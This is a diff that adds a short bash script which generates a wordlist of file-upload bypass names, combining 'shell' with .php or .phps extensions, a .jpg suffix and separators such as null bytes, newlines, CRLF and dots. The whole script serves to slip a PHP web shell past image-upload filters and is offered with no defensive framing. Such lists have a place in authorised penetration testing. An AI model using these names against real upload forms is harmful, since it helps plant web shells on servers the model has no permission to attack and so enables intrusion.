@@ -1,0 +1,8 @@
+for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
+    for ext in '.php' '.phps'; do
+        echo "shell$char$ext.jpg" >> shellext.txt
+        echo "shell$ext$char.jpg" >> shellext.txt
+        echo "shell.jpg$char$ext" >> shellext.txt
+        echo "shell.jpg$ext$char" >> shellext.txt
+    done
+done
